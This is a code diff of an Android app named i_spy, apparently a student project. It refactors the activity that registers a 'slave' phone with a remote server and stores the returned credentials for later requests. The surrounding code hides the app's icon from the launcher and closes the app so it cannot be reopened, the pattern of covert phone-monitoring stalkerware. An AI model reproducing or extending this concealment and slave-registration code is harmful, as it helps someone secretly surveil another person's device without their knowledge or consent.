@@ -3,7 +3,6 @@ package com.um.asn.i_spy;
 import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -16,7 +15,6 @@ import android.widget.EditText;
 import android.widget.Toast;
 
 import com.um.asn.i_spy.http_methods.HttpPostTask;
-import com.um.asn.i_spy.listeners.ConnectionListener;
 import com.um.asn.i_spy.services.SlaveService;
 
 import org.json.JSONException;
@@ -30,7 +28,6 @@ import java.util.concurrent.ExecutionException;
 public class RegisterSlaveActivity extends AppCompatActivity {
 
     public final static int REQUEST_ALL_PERM = 0;
-    public final static String SERVER_DOMAIN = "https://ispy.calyxe.fr/index.php/phone/";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -46,50 +43,56 @@ public class RegisterSlaveActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
 
-                final EditText register_slave_login = (EditText) findViewById(R.id.register_slave_login);
-                final EditText register_slave_password = (EditText) findViewById(R.id.register_slave_password);
-
-                if(!register_slave_login.getText().toString().equals("") && !register_slave_password.getText().toString().equals("")) {
+                /* Creation d'un objet HttpPostTask, execution de la methode
+                 * doInBackground et recuperation du resultat */
+                try {
 
                     ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
 
                     NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
                     if (networkInfo != null && networkInfo.isConnected()) {
 
-                        JSONObject jo = new JSONObject();
-                        try {
-                            jo.put("password", register_slave_password.getText().toString());
-                            jo.put("number", register_slave_login.getText().toString());
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
+                        String url = Config.SERVER_DOMAIN + "phones";
+                        final EditText login = (EditText) findViewById(R.id.register_slave_login);
+                        final EditText password = (EditText) findViewById(R.id.register_slave_password);
 
-                    /* Creation d'un objet HttpPostTask et execution de la méthode
-                     * doInBackground */
-                        JSONObject result = null;
-                        try {
-                            result = new JSONObject(
-                                    (String) new HttpPostTask().execute(new Object[]{SERVER_DOMAIN, jo.toString()}).get()
-                            );
+                        if (!login.getText().toString().equals("") && !password.getText().toString().equals("")) {
 
-                            if ((boolean)result.get("success")) {
+                            // Construction de l'objet json
+                            JSONObject phone = new JSONObject();
+                            phone.put("login", login.getText().toString());
+                            phone.put("password", password.getText().toString());
 
-                                // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
-                                registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
+                            JSONObject replyFromServer = new JSONObject((String) new HttpPostTask()
+                                    .execute(new Object[]{url, phone.toString()}).get());
 
-                                JSONObject data = (JSONObject) result.get("data");
+                            if (!((boolean) replyFromServer.get("success"))) {
 
-                                Toast.makeText(RegisterSlaveActivity.this, R.string.success, Toast.LENGTH_LONG).show();
+                                /* Handling error message from server*/
+                                String message = (String) replyFromServer.get("message");
+                                int toastMessage;
 
-                                try {
-                                    FileOutputStream file = openFileOutput("slave.txt", MODE_PRIVATE);
-                                    file.write(data.toString().getBytes());
-                                    file.close();
-                                } catch (FileNotFoundException e) {
-                                    e.printStackTrace();
-                                } catch (IOException e) {
-                                    e.printStackTrace();
+                                switch (message) {
+                                    case "uniqueLogin":
+                                        toastMessage = R.string.message_mail_already_exists;
+                                        break;
+                                    default:
+                                        toastMessage = R.string.message_internal_server_error;
+                                        break;
                                 }
+
+                                Toast.makeText(RegisterSlaveActivity.this,
+                                        toastMessage, Toast.LENGTH_LONG).show();
+                            } else {
+
+                                // le retour d'une requete select est un tableau JSON
+                                JSONObject obj = (JSONObject) replyFromServer.get("data");
+
+                                /* Ajout dans le fichier phone_info des informations du téléphone
+                                   pour l'envoi de l'id et password dans les futures requetes qu'il passera
+                                */
+                                FileOutputStream phoneInfoStream = openFileOutput(Config.PHONE_INFO, Context.MODE_PRIVATE);
+                                phoneInfoStream.write(obj.toString().getBytes());
 
                                 // Pour cacher l'icon de l'application dans la liste des app
                                 // Ferme l'app et empêche de la réouvrir...
@@ -114,23 +117,24 @@ public class RegisterSlaveActivity extends AppCompatActivity {
                                 intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                 intent.putExtra("EXIT", true);
                                 startActivity(intent);
-
-                            } else {
-                                Toast.makeText(RegisterSlaveActivity.this, getResources().getString(R.string.error) + " (" + result.get("message") + ")", Toast.LENGTH_LONG).show();
                             }
 
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        } catch (ExecutionException e) {
-                            e.printStackTrace();
-                        } catch (JSONException e) {
-                            e.printStackTrace();
                         }
-
 
                     } else {
                         Toast.makeText(RegisterSlaveActivity.this, R.string.message_internet_connection_error, Toast.LENGTH_LONG).show();
                     }
+
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                } catch (ExecutionException e) {
+                    e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
             }
         });
